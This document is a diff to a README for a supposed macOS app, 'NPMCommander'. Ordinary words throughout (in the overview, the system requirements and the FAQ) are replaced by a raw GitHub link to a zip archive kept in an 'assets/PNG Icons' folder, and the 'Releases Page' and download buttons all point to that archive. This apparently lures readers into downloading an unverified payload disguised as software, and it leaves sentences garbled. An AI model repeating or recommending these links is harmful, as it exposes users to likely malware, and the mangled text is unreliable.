@@ -1,11 +1,11 @@
 ```
 # 🚀 NPMCommander - Control NPM Easily on MacOS
 
-[![Download NPMCommander](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip)](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip)
+[![Download NPMCommander](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip)](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip)
 
 ## 📥 Overview
 
-NPMCommander is an easy-to-use application designed to run NPM commands like Build and Install without the need for a terminal. It simplifies the process for MacOS users, allowing you to manage your https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip projects effortlessly. Whether you're a beginner or someone looking for a clean interface, NPMCommander makes it simple to handle your NPM tasks.
+NPMCommander is an easy-to-use application designed to run NPM commands like Build and Install without the need for a terminal. It simplifies the process for MacOS users, allowing you to manage your https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip projects effortlessly. Whether you're a beginner or someone looking for a clean interface, NPMCommander makes it simple to handle your NPM tasks.
 
 ## 🛠 Features
 
@@ -19,7 +19,7 @@ NPMCommander is an easy-to-use application designed to run NPM commands like Bui
 ## 📋 System Requirements
 
 - **Operating System:** MacOS 10.13 or higher
-- **https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip** Must have https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip version 12 or higher installed
+- **https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip** Must have https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip version 12 or higher installed
 - **Memory:** At least 4GB of RAM (8GB recommended)
 - **Disk Space:** 100MB of free disk space
 - **Internet Connection:** Required for downloading packages
@@ -32,7 +32,7 @@ Follow the steps below to download and run NPMCommander:
 
 Click the link below to access the NPMCommander Releases page. 
 
-[Visit the Releases Page](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip)
 
 ### 2. Download the Latest Version
 
@@ -58,15 +58,15 @@ After launching, you will see an easy-to-navigate interface. You can choose to r
 
 To download NPMCommander, click the button below:
 
-[![Download NPMCommander](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip)](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip)
+[![Download NPMCommander](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip)](https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip)
 
 Follow the installation steps provided above to get started.
 
 ## ❓ Frequently Asked Questions
 
-### Q: Do I need to have https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip installed?
+### Q: Do I need to have https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip installed?
 
-A: Yes, you need https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v2.8.zip version 12 or higher installed on your Mac to use NPMCommander.
+A: Yes, you need https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip https://raw.githubusercontent.com/RDG721/NPMCommander/main/assets/PNG Icons/NPM_Commander_v3.9.zip version 12 or higher installed on your Mac to use NPMCommander.
 
 ### Q: Can I use NPMCommander on Windows or Linux?
 
